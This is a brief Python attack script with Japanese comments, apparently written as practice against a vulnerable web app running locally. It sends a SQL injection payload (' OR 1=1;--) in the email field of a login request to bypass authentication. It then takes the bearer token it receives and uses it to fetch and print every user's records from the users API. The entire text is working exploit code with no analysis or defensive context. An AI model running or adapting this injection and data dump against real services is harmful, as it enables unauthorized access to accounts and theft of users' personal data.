import requests

# 攻撃対象のURL
url = "http://localhost:3000/rest/user/login"

# 攻撃用のペイロード
payload = {
    "email": "' OR 1=1;--",
    "password": "aaa"
}

# 攻撃を実行
response = requests.post(url, json=payload)

# 結果の確認
if response.status_code == 200:
    print("攻撃が成功しました。")
    data = response.json()
    #取得したjsonファイルの構造がAuthenticationの中にtokenがあるので、tokenを取得する
    token = data["authentication"]["token"]
    print("取得したトークン:", token)

    myheaders = {"Authorization":f"Bearer {token}"}
    rsa_auth = requests.get("http://localhost:3000/api/Users",headers=myheaders)
    print("ステータスコード:",rsa_auth.status_code)
    print("全ユーザー情報:", rsa_auth.json())

else:
    print("攻撃が失敗しました。")
    print("ステータスコード:", response.status_code)